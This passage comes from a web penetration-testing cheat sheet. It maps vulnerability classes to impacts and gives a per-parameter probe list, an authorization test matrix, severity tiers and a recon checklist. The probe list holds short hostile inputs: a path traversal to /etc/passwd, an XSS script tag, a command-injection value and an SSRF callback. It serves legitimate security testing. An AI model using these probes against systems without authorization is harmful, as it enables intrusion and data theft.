| File system path | Path Traversal | File read, LFI, RFI |
| Deserializer | Insecure Deserialization | RCE |
| HTTP Host header | Host Header Injection | Password reset poison, cache poison, SSRF |
| Redirect target | Open Redirect | OAuth token theft, phishing |
| Cache key | Cache Poisoning | Stored XSS, DoS |

### What to Test on Every Parameter

```
1. Single quote '           → SQL injection
2. Double quote "           → XSS / injection context
3. <script>alert(1)</script> → XSS
4. ../../../etc/passwd      → Path traversal
5. http://your-oast.com     → SSRF
6. {{7*7}}                  → SSTI
7. ; sleep 5                → Command injection
8. %00                      → Null byte
9. Very long string (5000+) → Buffer overflow / truncation
10. Negative numbers        → Business logic
11. 0                       → Edge case behavior
12. Unicode / special chars → Encoding issues
```

### Authorization Test Matrix

```
For every endpoint, test with:
┌─────────────────────────────────────────────────┐
│ Token          │ Expected │ Actual │ Vulnerable? │
├─────────────────────────────────────────────────┤
│ No token       │ 401      │ ?      │ If 200      │
│ Invalid token  │ 401      │ ?      │ If 200      │
│ Other user     │ 403      │ ?      │ If 200      │
│ Lower priv     │ 403      │ ?      │ If 200      │
│ Deleted user   │ 401      │ ?      │ If 200      │
└─────────────────────────────────────────────────┘
```

### Severity Classification

| Severity | Examples |
|----------|---------|
| **Critical** | Unauthenticated RCE, SQLi dumping entire DB unauthenticated, account takeover at scale |
| **High** | Auth bypass, privilege escalation to admin, SSRF to internal systems, stored XSS |
| **Medium** | IDOR (read-only), reflected XSS, CSRF on sensitive action, information disclosure of sensitive data |
| **Low** | Verbose errors, missing security headers, self-XSS, CSRF on low-impact action |
| **Info** | Best-practice issues, minor information disclosure |

### Recon Checklist (One-Page)

```
□ CT logs → subdomains
□ DNS ALL records → infrastructure map
□ WHOIS → registrar, contacts, nameservers
□ Google dorks → exposed files, admin panels, credentials
□ robots.txt + sitemap.xml
□ .well-known/ endpoints
□ Wayback Machine → historical content
□ Subdomain brute force
□ VHost fuzzing → unlisted virtual hosts
□ Directory + file fuzzing on all hosts
□ JavaScript analysis → endpoints, secrets, routes
□ GitHub/code repo search → leaked credentials
□ Error page analysis → stack traces, internal paths
□ HTTP headers → server version, security header gaps
□ CORS configuration
□ TLS configuration
□ Cloud storage → S3, GCP, Azure blob enumeration
```